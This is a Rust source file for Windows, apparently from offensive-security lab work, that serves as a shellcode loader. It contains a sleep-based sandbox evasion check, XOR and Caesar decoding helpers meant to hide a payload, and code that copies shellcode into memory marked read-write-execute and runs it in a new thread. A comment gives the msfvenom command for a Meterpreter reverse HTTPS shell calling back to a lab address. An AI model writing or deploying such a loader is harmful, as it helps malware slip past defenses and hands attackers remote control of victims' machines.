use std::ffi::c_void;
use std::ptr;
use std::time::Instant;

#[link(name = "kernel32")]
unsafe extern "system" {
    fn Sleep(dwMilliseconds: u32);

    fn VirtualAlloc(
        lpAddress: *mut c_void,
        dwSize: usize,
        flAllocationType: u32,
        flProtect: u32,
    ) -> *mut c_void;

    fn CreateThread(
        lpThreadAttributes: *mut c_void,
        dwStackSize: usize,
        lpStartAddress: *mut c_void,
        lpParameter: *mut c_void,
        dwCreationFlags: u32,
        lpThreadId: *mut u32,
    ) -> *mut c_void;

    fn WaitForSingleObject(hHandle: *mut c_void, dwMilliseconds: u32) -> u32;
}

// Memory allocation constants
const MEM_COMMIT: u32 = 0x1000;
const MEM_RESERVE: u32 = 0x2000;
const PAGE_EXECUTE_READWRITE: u32 = 0x40;

fn main() {
    // Sleep-based sandbox evasion
    let t1 = Instant::now();
    unsafe { Sleep(2000) };
    let t2 = t1.elapsed().as_secs_f64();
    if t2 < 1.5 {
        return;
    }

    // msfvenom:
    // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.70 LPORT=8443 -f rust -o x.rs
    // encrypt/encode the shellcode generated by metasploit using one of the helpers (and use the function to decode it)
    let mut buf: Vec<u8> = vec![0xfc, 0x48, 0x83];

    buf = de_xor(buf);
    let size = buf.len();

    unsafe {
        let addr = VirtualAlloc(
            ptr::null_mut(),
            0x1000,
            MEM_COMMIT | MEM_RESERVE, // 0x3000
            PAGE_EXECUTE_READWRITE,   // 0x40
        );

        if addr.is_null() {
            return;
        }

        ptr::copy_nonoverlapping(buf.as_ptr(), addr as *mut u8, size);

        let h_thread = CreateThread(
            ptr::null_mut(),
            0,
            addr,
            ptr::null_mut(),
            0,
            ptr::null_mut(),
        );

        WaitForSingleObject(h_thread, 0xFFFFFFFF);
    }
}

#[allow(dead_code)]
fn decode_caesars(mut input: Vec<u8>) -> Vec<u8> {
    for i in 0..input.len() {
        input[i] = ((input[i] as u32).wrapping_sub(2) & 0xFF) as u8;
    }
    input
}

fn de_xor(mut input: Vec<u8>) -> Vec<u8> {
    let encryptor: u8 = 0x77;
    for i in 0..input.len() {
        input[i] ^= encryptor;
    }
    input
}
